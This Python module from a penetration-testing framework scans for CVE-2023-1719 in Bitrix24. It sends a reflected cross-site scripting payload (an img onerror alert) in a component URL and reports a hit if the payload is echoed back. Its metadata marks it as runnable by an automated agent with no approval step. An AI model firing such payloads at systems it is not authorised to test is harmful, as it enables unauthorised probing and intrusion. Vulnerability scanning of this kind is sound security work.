#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Global variable extraction in bitrix/modules/main/tools."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Bitrix Component - Cross-Site Scripting Detection',
        'description': 'Global variable extraction in bitrix/modules/main/tools.php in Bitrix24 22.0.300 allows unauthenticated remote attackers to (1) enumerate attachments on the server and (2) execute arbitrary JavaScript code in the victim’s browser, and possibly execute arbitrary PHP code on the server if the victim has administrator privilege, via overwriting uninitialised variables.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'bitrix', 'xss', 'bitrix24', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://starlabs.sg/advisories/23/23-1719/',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-1719',
            'https://github.com/20142995/sectool',
        ],
        'cve': 'CVE-2023-1719',
    }

    def run(self):
        r = self.http_request(method="GET", path='/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=<img%20onerror=alert(document.domain)%20src=1>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ("'LOG_CNT':", '<img onerror=alert(document.domain) src=1>',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="Bitrix Component - Cross-Site Scripting detected",
                path='/bitrix/components/bitrix/socialnetwork.events_dyn/get_message_2.php?log_cnt=<img%20onerror=alert(document.domain)%20src=1>',
            )
            return True
        return False

